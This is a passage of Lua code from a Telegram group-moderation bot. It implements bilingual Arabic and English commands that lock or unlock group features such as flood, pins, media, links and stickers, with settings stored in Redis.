if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock flood ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   التكرار  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'anti-flood:'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ flood » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  التكرار سابقا ✔️', 1, 'md')
end
end
end
if unlockpt[2] == "pin" or unlockpts[2] == "التثبيت" then
if DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been unlock pin ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🏆┇ تم فتح »   التثبيت  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(DevProx..'bot:pin:mute'..msg.chat_id_)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ pin » is already unlocked 🔑', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم فتح »  التثبيت سابقا ✔️', 1, 'md')
end
end
end
end
end
------------------------------------DevProx-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock gtime (%d+)$") then
local mutept = {string.match(text, "^[Ll]ock gtime (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
DevAbs:setex(DevProx..'bot:muteall'..msg.chat_id_, num, true)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Lock all has been enable for "..mutept[1].." hours ", 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم قفل الكل لمده "..mutept[1].." ساعه ", 'md')
end
end
if text:match("^قفل الكل بالساعات (%d+)$") then
local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
DevAbs:setex(DevProx..'bot:muteall'..msg.chat_id_, num, true)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "🎖┇ Lock all has been enable for "..mutept[1].." hours ", 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم قفل الكل لمده "..mutept[1].." ساعه ", 'md')
end
end
end
-----------------------------------------DevProx------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") then
local mutept = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور 🌟'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير 🥇'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن 🥈'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ 🎖'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير 🥇'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن 🥈'          
end
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutept[2] == "all" or  mutepts[2] == "الكل" then 
if not DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'editmsg'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) and not DevAbs:get(DevProx..'keed_bots'..msg.chat_id_) and not DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) and not DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock all ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  كل الوسائط  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 61, string.len(msg.sender_user_id_))
end 
DevAbs:set(DevProx..'editmsg'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:cmds'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:bots:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:bots:ban'..msg.chat_id_,true)
DevAbs:set(DevProx..'keed_bots'..msg.chat_id_,true)
DevAbs:set(DevProx..'anti-flood:'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:pin:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:text:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:inline:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:photo:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:spam:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:video:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:gifs:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:music:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:voice:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:links:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:location:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'tags:lock'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:strict'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:document:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:abstag:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:contact:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:webpage:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:arabic:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:english:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:sticker:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'markdown:lock'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:forward:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ all is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ تم قفل كل الوسائط سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "text" or mutepts[2] == "الدردشه" then
if not DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⏱┇ Has been lock text ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الدردشه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:text:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ text is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الدردشه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "inline" or mutepts[2] == "الاونلاين" then
if not DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock inline ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الاونلاين  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:inline:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ inline is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الاونلاين سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "photo" or mutepts[2] == "الصور" then
if not DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ The photos has been locked', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n❗️☻ تـۖم قفـڵ ٱڵـصـۄر فيۧ ٱڵمجـمۄعة  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 56, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:photo:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ photos is already locked', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـصـۄر بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "spam" or mutepts[2] == "الكلايش" then
if not DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock spam ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الكلايش  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:spam:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ spam is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الكلايش سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "video" or mutepts[2] == "الفيديو" then
if not DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock video ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الفيديو  \n⏰┇ بواسطه ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:video:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ video is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الفيديو سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "gif" or mutepts[2] == "المتحركه" then
if not DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock gif ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  المتحركه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:gifs:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ gif is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل المتحركه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "music" or mutepts[2] == "الاغاني" then
if not DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock music ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الاغاني  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:music:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ music is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الاغاني سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "voice" or mutepts[2] == "الصوت" then
if not DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock voice ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الصوت  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 56, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:voice:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ voice is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الصوت سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "links" or mutepts[2] == "الروابط" then
if not DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock links ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الروابط  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:links:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ links is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الروابط سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "location" or mutepts[2] == "المواقع" then
if not DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock location ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  المواقع  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:location:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ location is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل المواقع سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "tag" or mutepts[2] == "المعرف" then
if not DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock tag ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  المعرف  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 57, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'tags:lock'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ tag is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل المعرف سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "strict" or  mutepts[2] == "الحمايه" then
if not DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock strict ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الحمايه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:strict'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ strict is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الحمايه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "file" or mutepts[2] == "الملفات" then
if not DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock file ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الملفات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:document:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ file is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الملفات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "abstag" or mutepts[2] == "الهاشتاك" then
if not DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock abstag ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الهاشتاك  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:abstag:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ abstag is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الهاشتاك سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "contact" or mutepts[2] == "الجهات" then
if not DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock contact ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الجهات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 57, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:contact:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ contact is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الجهات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "webpage" or mutepts[2] == "الشبكات" then
if not DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock webpage ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الشبكات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:webpage:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ webpage is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الشبكات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "arabic" or mutepts[2] == "العربيه" then
if not DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock arabic ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  العربيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:arabic:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ arabic is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل العربيه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "english" or mutepts[2] == "الانكليزيه" then
if not DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '??┇ Has been lock english ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الانكليزيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 61, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:english:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ english is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الانكليزيه سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "sticker" or mutepts[2] == "الملصقات" then
if not DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock sticker ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🧧┇ تم قفل الملصقات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 59, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:sticker:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ sticker is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الملصقات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "markdown" or mutepts[2] == "الماركداون" then
if not DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock markdown ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الماركداون  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 61, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'markdown:lock'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ markdown is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الماركداون سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "tgservice" or mutepts[2] == "الاشعارات" then
if not DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock tgservice ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  الاشعارات  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 60, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:tgservice:jk'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ tgserice is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل الاشعارات سابقا ✔️', 1, 'md')
end
end
end
if mutept[2] == "fwd" or mutepts[2] == "التوجيه" then
if not DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ Has been lock fwd ☑️', 1, 'md')
else
local DevProx = '📤┇ رتبتك : '..tar..' \n🗑┇ تم قفل »  التوجيه  \n🚸┇بواسطة ('..msg.sender_user_id_..') '
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevProx, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(DevProx..'bot:forward:mute'..msg.chat_id_,true)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ fwd is already locked ✔️', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم قفل التوجيه سابقا ✔️', 1, 'md')
end
end
end
end
end
if text == 'قفل الفشار' and is_owner(msg.sender_user_id_, msg.chat_id_) then
